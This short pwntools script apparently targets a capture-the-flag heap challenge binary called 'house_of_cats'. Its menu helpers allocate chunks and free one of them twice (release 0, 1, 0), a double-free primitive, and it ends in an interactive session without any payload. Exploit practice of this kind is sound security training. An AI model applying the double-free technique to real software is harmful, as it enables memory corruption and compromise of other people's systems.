from pwn import *

elf = ELF( './house_of_cats' )
lib = ELF( './libc.so.6' )

def rescue( len, name ):
	p.recvuntil( ': ' )
	p.sendline( str( 1 ) )
	p.recvuntil( ': ' )
	p.sendline( str( len ) )
	p.recvuntil( ': ' )
	p.send( name )

def show( idx ):
	p.recvuntil( ': ' )
	p.sendline( str( 2 ) )
	p.recvuntil( ': ' )
	p.sendline( str( idx ) )

def release( idx ):
	p.recvuntil( ': ' )
	p.sendline( str( 3 ) )
	p.recvuntil( ': ' )
	p.sendline( str( idx ) )

p = elf.process()

rescue( 16, 'AAAA' )
rescue( 16, 'BBBB' )

release( 0 )
release( 1 )
release( 0 )
rescue( 16, 'CCCC' )
rescue( 16, 'DDDD' )

p.interactive()
